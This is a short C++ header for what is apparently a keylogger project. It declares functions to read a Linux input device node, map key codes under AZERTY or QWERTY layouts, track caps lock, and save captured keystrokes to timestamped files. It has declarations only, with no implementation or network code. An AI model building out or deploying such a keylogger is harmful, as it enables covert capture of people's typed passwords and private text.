#ifndef __RKEYLOGGER_APK__
#define __RKEYLOGGER_APK__
    
    #include <string>
    
    enum class Layout { AZERTY, QWERTY };
    struct KeyValue{ const char* normal; const char* shift; const char* altgr; };

    void read_devnode(const char* devnode);
    bool map_code(int code, int value);
    void emit_correct_code(int code);

    //save input
    bool create_save_folder();
    void close_save_file();
    void save_input(const char* text);

    //TODO
    void setLayout(Layout layout);

    //UTILS 
    std::string current_datetime();

    //To detect if capslock was already pressed when we launch the programs
    bool get_capsclock_status();
#endif